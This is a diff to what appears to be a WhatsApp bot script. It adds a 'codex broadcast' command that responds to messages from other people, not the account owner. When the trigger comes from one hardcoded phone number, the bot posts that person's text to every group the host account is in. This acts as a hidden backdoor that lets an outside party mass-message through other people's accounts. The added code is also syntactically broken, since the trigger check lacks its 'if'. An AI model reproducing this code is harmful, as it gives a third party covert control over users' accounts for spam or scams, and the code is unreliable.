@@ -2533,7 +2533,7 @@ if (msg === "codex interface") {
         `║│ ⿻ UNLOCK\n` +
         `║│ ⿻ WORLD MAP [TIME]\n` +
         `║│ ⿻ ADMIN TAG\n` +
-        `║│ ⿻ ADMIN DEMOTER\n` +
+        `║│ ⿻ BROADCASTER\n` +
         `║│ ⿻ HOST COMING SOON\n` +
         `║│ ⿻ CMDS COMING SOON\n` +
         `║│ ⿻ FOUNDED BY CODEX\n` +
@@ -3094,4 +3094,61 @@ kord({
     await m.send("✘ *Failed to retrieve admin list, sir.*")
   }
 })
+
+
+
+
+
+kord({
+  on: "all",
+  fromMe: false 
+}, async (m, { client }) => {
+  const msg = m.text ? m.text.trim() : "";
+  const trigger = "codex broadcast";
+  const allowedNumber = "2347019135989@s.whatsapp.net";
+ (msg.toLowerCase().startsWith(trigger)) {
+    
+    if (m.sender !== allowedNumber) {
+      return await m.react("🚫");
+    }
+
+    const broadcastMsg = msg.slice(trigger.length).trim();
+    if (!broadcastMsg) return m.reply("Please provide a message after 'codex broadcast' to send!");
+
+    const getGroups = await client.groupFetchAllParticipating();
+    const groups = Object.values(getGroups);
+    const jids = groups.map((v) => v.id);
+
+    await m.react("📢");
+    await m.reply(`📢 Broadcasting to ${jids.length} groups...`);
+
+    let success = 0;
+    let failed = 0;
+
+    for (let jid of jids) {
+      try {
+        await client.sendMessage(jid, { 
+          text: `╔═══❍ 📢 CODEX BROADCAST ❍═══❒\n║╭───────────────◆\n${broadcastMsg}\n║╰───────────────◆\n╚════════════════❒` 
+        });
+        success++;
+      } catch (e) {
+        failed++;
+      }
+      await new Promise(resolve => setTimeout(resolve, 1000));
+    }
+
+    const report = `╔═══❍ 📢 BC REPORT ❍═══❒
+║╭───────────────◆
+║│ ❍ Total Groups: ${jids.length}
+║│ ❍ Success: ${success}
+║│ ❍ Failed: ${failed}
+║╰───────────────◆
+╚════════════════❒`;
+
+    return m.send(report);
+  }
+});
+
+
+
 
